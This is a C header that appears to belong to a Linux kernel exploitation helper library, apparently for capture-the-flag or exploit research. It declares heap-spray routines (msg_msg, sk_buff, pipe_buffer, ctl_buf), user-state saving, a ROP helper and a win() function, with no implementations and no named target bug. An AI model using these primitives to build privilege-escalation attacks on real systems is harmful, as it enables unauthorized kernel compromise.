// includes and stuff

#define PAGE_SIZE 0x1000

#define MSG_TAG 0xdeadbeefcafebabe
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE 8

#define SKB_SHARED_INFO_SIZE 320

struct state {
	uint64_t user_cs;
	uint64_t user_ss;
	uint64_t user_rsp;
	uint64_t user_rflags;
};

struct msg_msg {
	uint64_t m_list_next;
	uint64_t m_list_prev;
	uint64_t m_type;
	uint64_t m_ts;
	uint64_t next;
	uint64_t security;
};

struct ctl_buf_spray_context {
	int num;
	char * payload;
	size_t size;
	int cfd[2];
	int sfd[][2];
};

struct ctl_buf_spray_per_thread_context {
	struct ctl_buf_spray_context * main_context;
	size_t idx;
};

// Standard setup
void win();

void force_single_core(int cpu);
void save_state(struct state * s);

void init_exploit(struct state * s, void * sigsegv_handler); // Pass NULL if not registering a handler

// Specialised setup
int increase_fd_limit();

// Message queues
void msgq_init(int fd[], int num);
void msgq_send(int fd, void * msgp, size_t msglen);
void msgq_copy(int fd, void * msgp, size_t msglen, long index);
void msgq_recv(int fd, void * msgp, size_t msglen, long msgtyp);

void msgq_spray(int fd[], int num, void * msgp, size_t msglen); // For static sprays (all payloads are the same)
void msgq_unspray(int fd[], int num, void * msgp, size_t msglen, long msgtyp); // For use with the above

// Sockets
void skpair_init(int fd[][2], int num, int domain, int type, int protocol);
void skbuff_spray(int fd[][2], int num_sock, int num_per_sock, char * buf, size_t size);
void skbuff_unspray(int fd[][2], int num_sock, int num_per_sock, char * buf, size_t size);

// Pipes
void pipe_init(int fd[][2], int num);
void pipe_buffer_spray(int fd[][2], int num);
void pipe_free(int fd[][2], int num);

// ctl_buf spray
/*
Usage: call...
- init_ctl_buf_spray() at the initialisation stage of the exploit. The payload need not be fixed yet.
- trigger_ctl_buf_spray() when you want the spray to actually happen.
- release_ctl_buf_spray() when you want to free the sprayed objects.

Be aware that initialising the spray will additionally result in the allocation of one sk_buff (in skbuff_head_cache) and one sk_buff data buffer per object to be sprayed.
These allocations are made after the ctl_buf is allocated, but before sendmsg() blocks on each thread. Some slab pages intended for cross-cache may be consumed.
They are not released when the ctl_buf is freed.
*/

static void * job(void * ptr);

struct ctl_buf_spray_context * init_ctl_buf_spray(int num, char * payload, size_t size);
void trigger_ctl_buf_spray(struct ctl_buf_spray_context * c);
void release_ctl_buf_spray(struct ctl_buf_spray_context * c);

// Sync

void sync_init(int * cfd);
void sync_wait_ready(int cfd[2], int num);
void sync_thread_ready(int cfd[2]);
void sync_release(int cfd[2], int num);

// ROP
void load_state(void * ptr, void * win, struct state * s);

// Misc
void debug(char * cmd, char * buf, size_t n);

